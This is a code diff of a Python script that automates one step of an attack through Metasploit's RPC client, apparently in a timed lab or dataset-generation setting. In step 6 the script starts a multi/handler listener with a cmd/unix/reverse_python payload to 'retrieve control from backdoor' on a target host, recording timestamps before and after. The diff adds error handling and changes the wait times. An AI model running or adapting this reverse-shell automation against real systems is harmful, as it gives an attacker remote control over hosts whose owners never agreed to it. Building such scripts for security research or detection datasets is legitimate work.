@@ -11,34 +11,32 @@ def record_timestamp(folder, output_time_file):
 
 
 def main(argv):
-    if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
-
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
 
-    output_time_file_end = 'time_step_5_end.txt'
-    record_timestamp(folder, output_time_file_end)
-    time.sleep(30)
-
     # start step 6
     output_time_file_start = 'time_step_6_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
 
-    # Retrieve control from backdoor
-    exploit = client.modules.use('exploit', 'multi/handler')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    payload['LHOST'] = my_ip
+    try:
+        # Retrieve control from backdoor
+        exploit = client.modules.use('exploit', 'multi/handler')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+        payload['LHOST'] = my_ip
 
-    exploit.execute(payload=payload)
+        exploit.execute(payload=payload)
+        
+    except Exception as e:
+        print(e)
+        pass
 
-    while client.jobs.list:
-        time.sleep(1)
-
+    time.sleep(30)
+    output_time_file_end = 'time_step_6_end.txt'
+    record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
 
